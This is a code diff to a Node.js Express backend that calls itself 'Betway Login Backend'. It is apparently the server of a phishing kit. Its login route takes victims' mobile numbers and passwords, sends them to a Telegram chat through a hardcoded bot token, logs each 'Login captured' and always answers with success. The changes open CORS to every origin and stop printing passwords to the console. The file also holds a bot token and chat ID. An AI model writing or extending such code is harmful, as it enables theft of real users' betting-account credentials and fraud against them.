@@ -5,19 +5,25 @@ const axios = require('axios');
 const app = express();
 const PORT = process.env.PORT || 5000;
 
-// Middleware
-app.use(cors());
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+// ============================================
+// UPDATED CORS - ALLOWS ALL ORIGINS
+// ============================================
+app.use(cors({
+    origin: '*', // This allows any device to connect
+    methods: ['GET', 'POST'],
+    allowedHeaders: ['Content-Type']
+}));
 
-// Telegram Config - HARDCODED
+app.use(express.json());
+
+// Telegram Config
 const TELEGRAM_BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
 const TELEGRAM_CHAT_ID = '8392790531';
 
 // Test route
 app.get('/', (req, res) => {
-    res.json({ 
-        status: 'online', 
+    res.json({
+        status: 'online',
         message: 'Betway Login Backend is running!',
         port: PORT
     });
@@ -29,7 +35,6 @@ app.post('/api/login', async (req, res) => {
         const { mobileNumber, password } = req.body;
 
         console.log('📱 Received mobile:', mobileNumber);
-        console.log('🔑 Received password:', password);
 
         if (!mobileNumber || !password) {
             return res.status(400).json({
@@ -53,15 +58,14 @@ app.post('/api/login', async (req, res) => {
         `;
 
         const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        
-        const response = await axios.post(telegramUrl, {
+
+        await axios.post(telegramUrl, {
             chat_id: TELEGRAM_CHAT_ID,
             text: message,
             parse_mode: 'Markdown'
         });
 
         console.log(`✅ Login captured: ${mobileNumber}`);
-        console.log('📡 Telegram response:', response.status);
 
         // Always return success
         res.json({
